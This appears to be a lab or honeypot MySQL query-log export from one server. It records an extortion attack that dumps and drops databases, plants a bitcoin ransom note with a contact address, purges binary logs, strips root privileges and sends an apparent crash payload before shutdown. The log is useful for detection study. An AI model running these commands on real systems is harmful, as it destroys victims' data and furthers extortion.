TimeGenerated,DeviceName,ActionType,Query,RawData
"Sep 2, 2026 8:08:19 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-03T00:08:19.718686Z   103 Query SELECT @@max_allowed_packet
"Sep 2, 2026 7:57:59 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T23:57:59.169920Z    98 Query SELECT @@max_allowed_packet
"Sep 2, 2026 7:24:35 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-02T23:24:35.710916Z    93 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 2, 2026 7:24:35 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:35.617474Z    93 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:35 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:35.241692Z    92 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:34.396887Z    90 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T23:24:34.001098Z    89 Query SHOW DATABASES
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T23:24:34.868636Z    91 Query SHOW DATABASES
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:34.774574Z    91 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:33 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:33.903601Z    89 Query SET AUTOCOMMIT=0
"Sep 2, 2026 6:40:55 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T22:40:55.236669Z    88 Query SELECT @@max_allowed_packet
"Sep 2, 2026 5:22:40 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T21:22:40.648855Z    80 Query SELECT @@max_allowed_packet
"Sep 2, 2026 4:04:25 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T20:04:25.103739Z    75 Query SELECT @@max_allowed_packet
"Sep 2, 2026 4:04:18 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T20:04:18.060274Z    70 Query SELECT @@max_allowed_packet
"Sep 2, 2026 2:46:14 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T18:46:14.075039Z    65 Query SELECT @@max_allowed_packet
"Sep 2, 2026 1:21:14 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T17:21:14.564249Z    58 Query SELECT @@max_allowed_packet
"Sep 2, 2026 12:43:26 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-02T16:43:26.533464Z    53 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 2, 2026 12:43:26 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T16:43:26.036083Z    52 Query SHOW DATABASES
"Sep 2, 2026 12:43:26 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T16:43:26.439436Z    53 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:43:25 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T16:43:25.941440Z    52 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:43:25 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T16:43:25.562901Z    51 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:43:18 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T16:43:18.637682Z    49 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:40:09 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T16:40:09.890188Z    46 Query SELECT @@max_allowed_packet
"Sep 2, 2026 11:56:13 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T15:56:13.252025Z    39 Query SELECT @@max_allowed_packet
"Sep 2, 2026 10:31:14 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T14:31:14.133022Z    34 Query SELECT @@max_allowed_packet
"Sep 2, 2026 9:13:03 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T13:13:03.553315Z    29 Query SELECT @@max_allowed_packet
"Sep 2, 2026 8:33:22 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T12:33:22.243170Z    24 Query SELECT @@max_allowed_packet
"Sep 2, 2026 7:55:05 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T11:55:05.796776Z    19 Query SELECT @@max_allowed_packet
"Sep 2, 2026 4:00:33 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T08:00:33.164262Z   156 Query SELECT @@max_allowed_packet
"Sep 2, 2026 2:42:35 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T06:42:35.118535Z   149 Query SELECT @@max_allowed_packet
"Sep 2, 2026 1:24:14 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T05:24:14.178095Z   142 Query SELECT @@max_allowed_packet
"Sep 2, 2026 1:03:14 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T05:03:14.850713Z   137 Query SELECT @@max_allowed_packet
"Sep 2, 2026 12:11:34 AM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T04:11:34.738359Z   130 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:11:34 AM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-02T04:11:34.829588Z   130 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 2, 2026 12:11:34 AM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T04:11:34.272158Z   129 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:11:34 AM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T04:11:34.362493Z   129 Query SHOW DATABASES
"Sep 2, 2026 12:11:33 AM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T04:11:33.818724Z   128 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:11:28 AM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T04:11:27.995348Z   126 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:06:14 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T04:06:14.508632Z   123 Query SELECT @@max_allowed_packet
"Sep 1, 2026 11:52:51 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:51.297728Z   118 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:51 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-02T03:52:51.388657Z   118 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 1, 2026 11:52:51 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:50.932746Z   117 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:50 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:50.113895Z   115 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:50 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T03:52:50.568492Z   116 Query SHOW DATABASES
"Sep 1, 2026 11:52:50 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:50.477500Z   116 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:49 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T03:52:49.717856Z   114 Query SHOW DATABASES
"Sep 1, 2026 11:52:49 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:49.623502Z   114 Query SET AUTOCOMMIT=0
"Sep 1, 2026 10:48:14 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T02:48:14.495205Z   113 Query SELECT @@max_allowed_packet
"Sep 1, 2026 9:34:30 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T01:34:29.869206Z   106 Query SELECT @@max_allowed_packet
"Sep 1, 2026 9:28:21 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T01:28:20.992645Z   101 Query SELECT @@max_allowed_packet
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, SHOW DATABASES LIKE 'mat_server',2026-09-02T00:17:55.019054Z    94 Query SHOW DATABASES LIKE 'mat_server'
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, commit,2026-09-02T00:17:55.249631Z    94 Query commit
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T00:17:55.709519Z    94 Query SHOW DATABASES
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, commit,2026-09-02T00:17:55.939708Z    94 Query commit
"Sep 1, 2026 8:17:54 PM",datafiles-corp-s01,Query, SET NAMES utf8mb4,2026-09-02T00:17:54.330151Z    94 Query SET NAMES utf8mb4
"Sep 1, 2026 8:17:54 PM",datafiles-corp-s01,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-09-02T00:17:54.100609Z    94 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Sep 1, 2026 8:17:54 PM",datafiles-corp-s01,Query, set autocommit=0,2026-09-02T00:17:54.559654Z    94 Query set autocommit=0
"Sep 1, 2026 8:09:18 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T00:09:18.271454Z    93 Query SELECT @@max_allowed_packet
"Sep 1, 2026 4:28:19 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T20:28:18.873943Z    84 Query SHOW DATABASES
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query, SHUTDOWN,2026-09-01T20:28:17.935292Z    82 Query SHUTDOWN
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:18.779246Z    84 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query," SELECT JSON_SCHEMA_VALID('{""enum"":[0]}', '\""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\""')","2026-09-01T20:28:18.403090Z    83 Query SELECT JSON_SCHEMA_VALID('{""enum"":[0]}', '\""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\""')"
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:18.308290Z    83 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query, GRANT SHUTDOWN ON *.* TO `root`@'%',2026-09-01T20:28:17.383990Z    81 Query GRANT SHUTDOWN ON *.* TO `root`@'%'
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query," REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'","2026-09-01T20:28:16.915501Z    80 Query REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'"
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:17.293644Z    81 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:17.843590Z    82 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:16.238553Z    79 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:16.822570Z    80 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, SHOW MASTER STATUS,2026-09-01T20:28:16.329190Z    79 Query SHOW MASTER STATUS
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001',2026-09-01T20:28:16.419597Z    79 Query PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001'
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:15.729619Z    78 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-09-01T20:28:14.942893Z    77 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:15.346454Z    77 Query COMMIT
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-09-01T20:28:15.160060Z    77 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1'),2026-09-01T20:28:15.253704Z    77 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1')
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, RESET MASTER,2026-09-01T20:28:15.822907Z    78 Query RESET MASTER
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:15.067579Z    77 Query COMMIT
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, USE RECOVER_YOUR_DATA,2026-09-01T20:28:14.754844Z    77 Query USE RECOVER_YOUR_DATA
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-01T20:28:14.561278Z    77 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:14.096999Z    76 Query COMMIT
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:14.661714Z    77 Query COMMIT
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, SHOW TABLES,2026-09-01T20:28:14.849333Z    77 Query SHOW TABLES
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:14.468128Z    77 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, DROP DATABASE `world`,2026-09-01T20:28:13.955839Z    76 Query DROP DATABASE `world`
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:13.191956Z    76 Query COMMIT
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, DROP DATABASE `recover_your_data`,2026-09-01T20:28:13.284134Z    76 Query DROP DATABASE `recover_your_data`
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:13.398574Z    76 Query COMMIT
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, DROP DATABASE `cr_corp_01`,2026-09-01T20:28:13.035604Z    76 Query DROP DATABASE `cr_corp_01`
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:13.864284Z    76 Query COMMIT
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:12.943186Z    76 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, DROP DATABASE `sakila`,2026-09-01T20:28:13.492059Z    76 Query DROP DATABASE `sakila`
"Sep 1, 2026 4:28:12 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:12.344303Z    75 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:12 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:12.253357Z    75 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:12 PM",datafiles-corp-s01,Query, SELECT * FROM `countrylanguage`,2026-09-01T20:28:12.435889Z    75 Query SELECT * FROM `countrylanguage`
"Sep 1, 2026 4:28:11 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:11.459530Z    74 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:11 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:11.553909Z    74 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:11 PM",datafiles-corp-s01,Query, SELECT * FROM `country`,2026-09-01T20:28:11.648554Z    74 Query SELECT * FROM `country`
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:28:09.974815Z    72 Query SHOW tables
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:10.427238Z    73 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, USE `world`,2026-09-01T20:28:09.883629Z    72 Query USE `world`
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, SELECT * FROM `city`,2026-09-01T20:28:10.609633Z    73 Query SELECT * FROM `city`
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:10.518192Z    73 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world',2026-09-01T20:28:09.789449Z    72 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world'
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:09.330139Z    71 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:09.698064Z    72 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SELECT * FROM `store`,2026-09-01T20:28:08.931239Z    70 Query SELECT * FROM `store`
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:08.062830Z    69 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query, SELECT * FROM `staff_list`,2026-09-01T20:28:08.251953Z    69 Query SELECT * FROM `staff_list`
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:08.837148Z    70 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:08.743188Z    70 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:08.158093Z    69 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:07 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:07.297792Z    68 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:07 PM",datafiles-corp-s01,Query, SELECT * FROM `staff`,2026-09-01T20:28:07.481396Z    68 Query SELECT * FROM `staff`
"Sep 1, 2026 4:28:07 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:07.389410Z    68 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query, SELECT * FROM `sales_by_film_category`,2026-09-01T20:28:06.002918Z    66 Query SELECT * FROM `sales_by_film_category`
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:06.560745Z    67 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:06.653919Z    67 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query, SELECT * FROM `sales_by_store`,2026-09-01T20:28:06.747415Z    67 Query SELECT * FROM `sales_by_store`
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:05.908329Z    66 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:05 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:05.813837Z    66 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:04 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:04.433656Z    65 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:04 PM",datafiles-corp-s01,Query, SELECT * FROM `rental`,2026-09-01T20:28:04.621580Z    65 Query SELECT * FROM `rental`
"Sep 1, 2026 4:28:04 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:04.527402Z    65 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:03 PM",datafiles-corp-s01,Query, SELECT * FROM `payment`,2026-09-01T20:28:03.269682Z    64 Query SELECT * FROM `payment`
"Sep 1, 2026 4:28:03 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:03.175168Z    64 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:03 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:03.076732Z    64 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:02 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:01.958474Z    63 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:02 PM",datafiles-corp-s01,Query, SELECT * FROM `nicer_but_slower_film_list`,2026-09-01T20:28:02.050593Z    63 Query SELECT * FROM `nicer_but_slower_film_list`
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query, SELECT * FROM `language`,2026-09-01T20:28:01.309783Z    62 Query SELECT * FROM `language`
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:01.862797Z    63 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:01.217749Z    62 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:01.125857Z    62 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:00 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:00.181789Z    61 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:00 PM",datafiles-corp-s01,Query, SELECT * FROM `inventory`,2026-09-01T20:28:00.365021Z    61 Query SELECT * FROM `inventory`
"Sep 1, 2026 4:28:00 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:00.273337Z    61 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:59 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:59.316169Z    60 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:59 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:59.223098Z    60 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:59 PM",datafiles-corp-s01,Query, SELECT * FROM `film_text`,2026-09-01T20:27:59.412610Z    60 Query SELECT * FROM `film_text`
"Sep 1, 2026 4:27:58 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:58.163953Z    59 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:58 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:58.070509Z    59 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:58 PM",datafiles-corp-s01,Query, SELECT * FROM `film_list`,2026-09-01T20:27:58.258829Z    59 Query SELECT * FROM `film_list`
"Sep 1, 2026 4:27:57 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:57.393906Z    58 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:57 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:57.302442Z    58 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:57 PM",datafiles-corp-s01,Query, SELECT * FROM `film_category`,2026-09-01T20:27:57.486614Z    58 Query SELECT * FROM `film_category`
"Sep 1, 2026 4:27:56 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:56.426267Z    57 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:56 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:56.331796Z    57 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:56 PM",datafiles-corp-s01,Query, SELECT * FROM `film_actor`,2026-09-01T20:27:56.521397Z    57 Query SELECT * FROM `film_actor`
"Sep 1, 2026 4:27:55 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:55.379368Z    56 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:55 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:55.285963Z    56 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:55 PM",datafiles-corp-s01,Query, SELECT * FROM `film`,2026-09-01T20:27:55.474550Z    56 Query SELECT * FROM `film`
"Sep 1, 2026 4:27:54 PM",datafiles-corp-s01,Query, SELECT * FROM `customer_list`,2026-09-01T20:27:54.614035Z    55 Query SELECT * FROM `customer_list`
"Sep 1, 2026 4:27:54 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:54.519427Z    55 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:54 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:54.425428Z    55 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:52.913123Z    53 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:53.634232Z    54 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query, SELECT * FROM `country`,2026-09-01T20:27:53.006348Z    53 Query SELECT * FROM `country`
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query, SELECT * FROM `customer`,2026-09-01T20:27:53.726104Z    54 Query SELECT * FROM `customer`
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:53.542383Z    54 Query SET AUTOCOMMIT=0
